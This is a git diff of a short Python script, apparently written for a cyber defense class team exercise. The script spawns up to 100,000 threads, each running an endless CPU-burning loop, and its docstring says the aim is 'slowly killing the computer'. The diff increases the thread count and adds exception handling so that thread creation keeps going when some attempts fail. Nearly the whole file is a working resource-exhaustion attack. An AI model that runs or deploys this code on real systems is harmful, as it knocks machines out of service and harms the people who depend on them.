@@ -1,5 +1,6 @@
 #Matthew Repecki
-#Let it burn
+# Cyber Defense Techniques, Fall 2023
+# Team Bravo
 import math
 import random
 import threading
@@ -18,14 +19,22 @@ def eater():
             #Then we arent gonna have an integer overflow
             i = math.pow(i,2)
             b = i%random.randint(9999,10000)
+            print("Let it burn,let it burn, cant hold it back anymore. Let it burn, LET IT BURN.")
             #print(psutil.cpu_stats())
             #print(psutil.virtual_memory())
         else:
             #Reset the counter
             i = 10000001
 def create_threads():
-    for i in range(10000):
-        thread = threading.Thread(target=eater)
-        thread.start()
+    '''
+    Main program runner, creates a gazillion threads slowly killing the computer
+    :return:
+    '''
+    for i in range(100000):
+        try:
+            thread = threading.Thread(target=eater)
+            thread.start()
+        except:
+            continue
 
 create_threads()
